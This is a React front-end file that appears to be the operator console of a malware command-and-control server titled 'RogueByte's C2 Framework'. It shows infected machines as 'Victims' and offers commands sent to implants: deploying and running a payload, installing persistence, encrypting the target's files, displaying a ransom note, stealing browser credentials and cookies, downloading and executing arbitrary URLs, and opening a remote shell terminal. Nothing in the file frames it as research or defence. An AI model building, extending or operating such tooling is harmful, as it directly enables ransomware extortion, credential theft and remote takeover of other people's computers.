import { useState, useCallback, useEffect, useRef } from 'react'
import useSocket from './useSocket'

function timeAgo(dateStr) {
  if (!dateStr) return ''
  const d = new Date(dateStr.replace(' ', 'T'))
  const sec = Math.floor((Date.now() - d) / 1000)
  if (sec < 5) return 'just now'
  if (sec < 60) return `${sec}s ago`
  const min = Math.floor(sec / 60)
  if (min < 60) return `${min}m ago`
  const hr = Math.floor(min / 60)
  if (hr < 24) return `${hr}h ago`
  return `${Math.floor(hr / 24)}d ago`
}

const STAGER_CMDS = ['deploy', 'exec', 'persist', 'self_destruct', 'status']
const RANSOMWARE_CMDS = [
  'encrypt', 'decrypt', 'exec', 'persist', 'self_destruct', 'status',
  'download', 'upload', 'network_info', 'show_ransomnote',
  'screenshot', 'pslist', 'pskill', 'steal_browsers',
  'scare',
  '_terminal',
]

const CMD_META = {
  deploy:          { label: 'Deploy',    cls: 'action-deploy' },
  exec:            { label: 'Exec',      cls: '' },
  persist:         { label: 'Persist',   cls: '' },
  self_destruct:   { label: 'Destroy',   cls: 'danger' },
  status:          { label: 'Status',    cls: '' },
  encrypt:         { label: 'Encrypt',   cls: 'danger' },
  decrypt:         { label: 'Decrypt',   cls: '' },
  download:        { label: 'Download',  cls: '' },
  upload:          { label: 'Upload',    cls: '' },
  network_info:    { label: 'NetInfo',   cls: '' },
  show_ransomnote: { label: 'Note',      cls: '' },
  screenshot:      { label: 'Shot',      cls: '' },
  pslist:          { label: 'PSlist',    cls: '' },
  pskill:          { label: 'PSkill',    cls: 'danger' },
  steal_browsers:  { label: 'Steal',     cls: 'danger' },
  scare:           { label: 'SCARE',     cls: 'action-scare' },
  _terminal:       { label: 'Terminal',  cls: 'action-primary' },
}

function getAgentCmds(info) {
  const data = info?.data || {}
  const agent = (data.agent || '').toLowerCase()
  const type = (data.type || '').toLowerCase()
  if (agent === 'gpu_helper' || type === 'ransomware' || type === 'installer') return RANSOMWARE_CMDS
  return STAGER_CMDS
}

function Modal({ title, onClose, children }) {
  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal" onClick={e => e.stopPropagation()}>
        <div className="modal-header">
          <span>{title}</span>
          <button className="modal-close" onClick={onClose}>&times;</button>
        </div>
        <div className="modal-body">{children}</div>
      </div>
    </div>
  )
}

function Toast({ message, type }) {
  return <div className={`toast toast-${type}`}>{message}</div>
}

function ConfirmModal({ title, msg, btnText, btnClass, hostname, onSend, onClose, params, command }) {
  const handle = () => {
    onSend(hostname, command || title.toLowerCase().split(' ')[0], params || {})
    onClose()
  }
  return (
    <Modal title={`${title} — ${hostname}`} onClose={onClose}>
      <p>{msg}</p>
      <button className={`btn ${btnClass || ''}`} onClick={handle}>
        {btnText || title}
      </button>
    </Modal>
  )
}

function InputModal({ title, hostname, onSend, onClose, placeholder, btnText, paramKey }) {
  const [value, setValue] = useState('')
  const handle = () => {
    onSend(hostname, title.toLowerCase().split(' ')[0], { [paramKey]: value })
    onClose()
  }
  return (
    <Modal title={`${title} — ${hostname}`} onClose={onClose}>
      <input className="modal-input mono" placeholder={placeholder} value={value}
        onChange={e => setValue(e.target.value)} onKeyDown={e => e.key === 'Enter' && handle()} autoFocus />
      <button className="btn" onClick={handle}>{btnText || title}</button>
    </Modal>
  )
}

function TerminalModal({ hostname, logs, onClose, onSend }) {
  const [cmd, setCmd] = useState('')
  const [output, setOutput] = useState([])
  const bottomRef = useRef(null)

  useEffect(() => { setOutput([]) }, [hostname])

  useEffect(() => {
    const relevant = logs
      .filter(e => e.hostname === hostname && e.command === 'exec')
      .slice(0, 50)
    setOutput(relevant.map(e => ({
      cmd: e.result ? '' : '(sent)',
      result: e.result || '',
      ts: e.timestamp,
    })))
  }, [logs, hostname])

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [output])

  const handleSend = () => {
    if (!cmd.trim()) return
    setOutput(prev => [...prev, { cmd: `$ ${cmd}`, result: '', ts: '' }])
    onSend(hostname, 'exec', { cmd })
    setCmd('')
  }

  return (
    <Modal title={`Terminal — ${hostname}`} onClose={onClose}>
      <div className="terminal-output">
        {output.map((line, i) => (
          <div key={i}>
            {line.cmd && <div className="term-cmd">{line.cmd}</div>}
            {line.result && <div className="term-result">{line.result}</div>}
          </div>
        ))}
        <div ref={bottomRef} />
      </div>
      <div className="terminal-input-row">
        <span className="term-prompt">$</span>
        <input className="terminal-input" placeholder="command" value={cmd}
          onChange={e => setCmd(e.target.value)}
          onKeyDown={e => e.key === 'Enter' && handleSend()} autoFocus />
      </div>
    </Modal>
  )
}

function VictimCard({ hostname, info, selected, onClick, onAction, autoDeploy, onToggleAuto }) {
  const data = info?.data || {}
  const status = data?.status || 'unknown'
  const agent = data?.agent || '?'
  const os = data?.os || data?.platform || '?'
  const cmds = getAgentCmds(info)
  const isStager = !(agent === 'gpu_helper' || (data.type || '').toLowerCase() === 'installer' || (data.type || '').toLowerCase() === 'ransomware')
  const autoEnabled = !!autoDeploy[hostname]

  return (
    <div className={`victim-card ${selected ? 'selected' : ''}`} onClick={() => onClick(hostname)}>
      <div className="victim-card-header">
        <span className="victim-hostname mono">{hostname}</span>
        <div className="victim-badges">
          {autoEnabled && <span className="badge badge-auto">AUTO</span>}
          <span className={`badge badge-${status}`}>{status}</span>
          <span className="badge badge-agent">{agent}</span>
        </div>
      </div>
      <div className="victim-card-meta">
        <span className="ago">{timeAgo(info?.last_seen)}</span>
        <span className="os">{os}</span>
        {isStager && (
          <button className={`auto-toggle ${autoEnabled ? 'on' : ''}`}
            onClick={e => { e.stopPropagation(); onToggleAuto(hostname, !autoEnabled) }}>
            Auto {autoEnabled ? 'ON' : 'OFF'}
          </button>
        )}
      </div>
      <div className="victim-actions" onClick={e => e.stopPropagation()}>
        {cmds.map(cmd => {
          if (cmd === '_terminal') {
            return <button key={cmd} className="action-btn action-primary"
              onClick={() => onAction(cmd, hostname)}>Terminal</button>
          }
          const m = CMD_META[cmd]
          return <button key={cmd} className={`action-btn ${m.cls}`}
            onClick={() => onAction(cmd, hostname)}>{m.label}</button>
        })}
      </div>
    </div>
  )
}

function VictimDetail({ hostname, info }) {
  if (!hostname || !info) return null
  const data = info?.data || {}
  const result = info?.last_result?.result || null
  const { os, hostname: h2, agent, username, platform, architecture, version, status, type,
    ip, persistent, deployed, files_found, files_encrypted, ...rest } = data

  return (
    <div className="victim-detail">
      <h3 className="mono">{hostname}</h3>
      <dl className="detail-grid">
        <dt>Agent</dt><dd>{agent || '?'}</dd>
        <dt>Type</dt><dd>{type || '?'}</dd>
        <dt>OS</dt><dd>{os || platform || '?'}</dd>
        <dt>Arch</dt><dd>{architecture || '?'}</dd>
        <dt>Version</dt><dd>{version || '?'}</dd>
        <dt>User</dt><dd>{username || '?'}</dd>
        <dt>IP</dt><dd>{ip || '?'}</dd>
        <dt>Status</dt><dd>{status || '?'}</dd>
        <dt>Persistent</dt>
        <dd><span className={`badge-${persistent ? 'true' : 'false'}`}>{persistent ? 'yes' : 'no'}</span></dd>
        <dt>Deployed</dt>
        <dd><span className={`badge-${deployed ? 'true' : 'false'}`}>{deployed ? 'yes' : 'no'}</span></dd>
        {files_found !== undefined && files_found !== null && (
          <><dt>Files Found</dt><dd>{files_found}</dd></>
        )}
        {files_encrypted !== undefined && files_encrypted !== null && (
          <><dt>Files Encrypted</dt><dd>{files_encrypted}</dd></>
        )}
        {result !== null && (
          <>
            <dt>Last Result</dt>
            <dd className="result-cell">{result}</dd>
          </>
        )}
      </dl>
      {Object.keys(rest).length > 0 && (
        <>
          <h4>Extra Data</h4>
          <pre className="extra-data">{JSON.stringify(rest, null, 2)}</pre>
        </>
      )}
    </div>
  )
}

function computeStats(victims) {
  const entries = Object.entries(victims)
  let online = 0, offline = 0, encrypted = 0, deployed = 0
  for (const [, info] of entries) {
    const data = info?.data || {}
    const status = data?.status || 'unknown'
    if (status === 'active' || status === 'ok' || status === 'watchdog') online++
    else offline++
    if (status === 'encrypted') encrypted++
    if (data.deployed) deployed++
  }
  return { total: entries.length, online, offline, encrypted, deployed }
}

export default function App() {
  const { victims, logs, connected, autoDeploy, stats, sendCommand, toggleAutoDeploy } = useSocket()
  const [selectedHost, setSelectedHost] = useState(null)
  const [modal, setModal] = useState(null)
  const [toasts, setToasts] = useState([])
  const [theme, setTheme] = useState(() => localStorage.getItem('theme') || 'dark')

  useEffect(() => {
    document.documentElement.className = theme === 'light' ? 'light' : ''
    localStorage.setItem('theme', theme)
  }, [theme])

  const addToast = useCallback((msg, type = 'info') => {
    const id = Date.now()
    setToasts(p => [...p, { id, msg, type }])
    setTimeout(() => setToasts(p => p.filter(t => t.id !== id)), 3000)
  }, [])

  const handleSend = useCallback((hostname, command, params = {}) => {
    sendCommand(hostname, command, params)
    addToast(`Sent ${command} to ${hostname}`, 'success')
  }, [sendCommand, addToast])

  const handleAction = useCallback((cmd, hostname) => {
    if (cmd === '_terminal') {
      setModal({ cmd: '_terminal', hostname })
      return
    }
    setModal({ cmd, hostname })
  }, [])

  const handleShutdown = useCallback(() => {
    setModal({ cmd: '_shutdown' })
  }, [])

  useEffect(() => {
    if (selectedHost && !victims[selectedHost]) {
      setSelectedHost(null)
    }
  }, [victims, selectedHost])

  const s = computeStats(victims)

  function renderModal() {
    if (!modal) return null
    const { cmd, hostname } = modal
    const close = () => setModal(null)

    if (cmd === '_terminal') {
      return <TerminalModal hostname={hostname} logs={logs} onClose={close} onSend={handleSend} />
    }

    if (cmd === '_shutdown') {
      return (
        <Modal title="Shutdown Server" onClose={close}>
          <p>Stop the C2 server? All active connections will be terminated.</p>
          <div style={{ display: 'flex', gap: '0.5rem', justifyContent: 'flex-end' }}>
            <button className="btn" style={{ background: 'transparent', border: '1px solid var(--border)', color: 'var(--text-muted)' }} onClick={close}>Cancel</button>
            <button className="btn btn-danger" onClick={() => {
              fetch('/api/shutdown', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ key: 'shutdown' }),
              }).catch(() => {})
              addToast('Server shutting down...', 'error')
              close()
            }}>Shutdown</button>
          </div>
        </Modal>
      )
    }

    switch (cmd) {
      case 'deploy':
        return <ConfirmModal title="Deploy" hostname={hostname} btnText="Deploy Payload"
          msg="Send the deploy command to download and execute the gpu_helper payload on this target?" onSend={handleSend} onClose={close} />
      case 'exec':
        return <InputModal title="Exec" hostname={hostname} placeholder="command to run" paramKey="cmd" btnText="Execute" onSend={handleSend} onClose={close} />
      case 'persist':
        return <ConfirmModal title="Persist" hostname={hostname} btnText="Install Persistence"
          msg="Install persistence (systemd/schtasks) on this target?" onSend={handleSend} onClose={close} />
      case 'self_destruct':
        return <ConfirmModal title="Self-Destruct" hostname={hostname} btnText="Self-Destruct" btnClass="btn-danger" command="self_destruct"
          msg="This will remove all persistence, delete the binary, and clean itself. Are you sure?" onSend={handleSend} onClose={close} />
      case 'status':
        return <ConfirmModal title="Status" hostname={hostname} btnText="Request Status"
          msg="Request current status from the target agent?" onSend={handleSend} onClose={close} />
      case 'encrypt':
        return <ConfirmModal title="Encrypt" hostname={hostname} btnText="Start Encryption" btnClass="btn-danger"
          msg="Encrypt all target files? THIS IS IRREVERSIBLE without the key." onSend={handleSend} onClose={close} />
      case 'decrypt':
        return <InputModal title="Decrypt" hostname={hostname} placeholder="Encryption key (base64)" paramKey="key" btnText="Decrypt Files" onSend={handleSend} onClose={close} />
      case 'download':
        return <InputModal title="Download" hostname={hostname} placeholder="URL to download and execute" paramKey="url" btnText="Download & Execute" onSend={handleSend} onClose={close} />
      case 'upload':
        return <InputModal title="Upload" hostname={hostname} placeholder="Destination path (optional)" paramKey="path" btnText="Upload Payload" onSend={handleSend} onClose={close} />
      case 'network_info':
        return <ConfirmModal title="NetInfo" hostname={hostname} btnText="Get Network Info"
          msg="Collect network info from this target?" onSend={handleSend} onClose={close} />
      case 'show_ransomnote':
        return <ConfirmModal title="Show Note" hostname={hostname} btnText="Display Ransom Note"
          msg="Display the ransom note on the target's desktop?" onSend={handleSend} onClose={close} />
      case 'screenshot':
        return <ConfirmModal title="Screenshot" hostname={hostname} btnText="Capture"
          msg="Capture the desktop screen and upload to server?" onSend={handleSend} onClose={close} />
      case 'pslist':
        return <ConfirmModal title="PSlist" hostname={hostname} btnText="List Processes"
          msg="List all running processes on the target?" onSend={handleSend} onClose={close} />
      case 'pskill':
        return <InputModal title="PSkill" hostname={hostname} placeholder="Process ID to kill" paramKey="pid" btnText="Kill Process" onSend={handleSend} onClose={close} />
      case 'steal_browsers':
        return <ConfirmModal title="Steal Browsers" hostname={hostname} btnText="Steal Now" btnClass="btn-danger"
          msg="Collect saved browser credentials, cookies, and profile data and exfil to server?" onSend={handleSend} onClose={close} />
      case 'scare':
        return <ConfirmModal title="SCARE" hostname={hostname} btnText="Deploy SCARE" btnClass="btn-scare"
          msg="Download and scatter DedSec-themed GIFs across the system, open 5 in browser windows?" onSend={handleSend} onClose={close} />
      default:
        return null
    }
  }

  return (
    <div className="app">
      <header className="topbar">
        <h1 className="title">RogueByte's C2 Framework</h1>
        <div className="stats">
          <span className={`status-dot ${connected ? 'online' : 'offline'}`} />
          <span>{connected ? 'Connected' : 'Disconnected'}</span>
          <span className="stat-group">Victims <strong>{s.total}</strong></span>
          <span className="stat-group">Online <strong>{s.online}</strong></span>
          <span className="stat-group">Encrypted <strong>{s.encrypted}</strong></span>
          <span className="stat-group">Deployed <strong>{s.deployed}</strong></span>
        </div>
        <div className="topbar-actions">
          <button className="icon-btn" onClick={() => setTheme(t => t === 'dark' ? 'light' : 'dark')}
            title="Toggle theme">{theme === 'dark' ? '☀' : '☾'}</button>
          <button className="icon-btn danger" onClick={handleShutdown}
            title="Shutdown server">⬡</button>
        </div>
      </header>

      <main className="main">
        <section className="panel victims-panel">
          <div className="panel-header">
            Victims <span className="count">{s.total}</span>
          </div>
          <div className="victims-list">
            {Object.entries(victims).map(([hostname, info]) => (
              <VictimCard key={hostname} hostname={hostname} info={info}
                selected={selectedHost === hostname}
                onClick={setSelectedHost} onAction={handleAction}
                autoDeploy={autoDeploy} onToggleAuto={toggleAutoDeploy} />
            ))}
            {Object.keys(victims).length === 0 && (
              <div className="empty-state">No victims yet — waiting for beacons...</div>
            )}
          </div>
          {selectedHost && victims[selectedHost] && (
            <VictimDetail hostname={selectedHost} info={victims[selectedHost]} />
          )}
        </section>

        <section className="panel log-panel">
          <div className="panel-header">
            Command Log <span className="count">{stats.logCount}</span>
          </div>
          <div className="log-list">
            {logs.map((entry, i) => (
              <div key={i} className="log-entry">
                <span className="log-time">{entry.timestamp}</span>
                <span className="log-host">{entry.hostname}</span>
                <span className={`log-cmd cmd-${entry.command}`}>{entry.command}</span>
                {entry.result && <span className="log-result">{entry.result}</span>}
              </div>
            ))}
            {logs.length === 0 && (
              <div className="empty-state">No commands yet</div>
            )}
          </div>
        </section>
      </main>

      {renderModal()}

      <div className="toast-container">
        {toasts.map(t => <Toast key={t.id} message={t.msg} type={t.type} />)}
      </div>
    </div>
  )
}
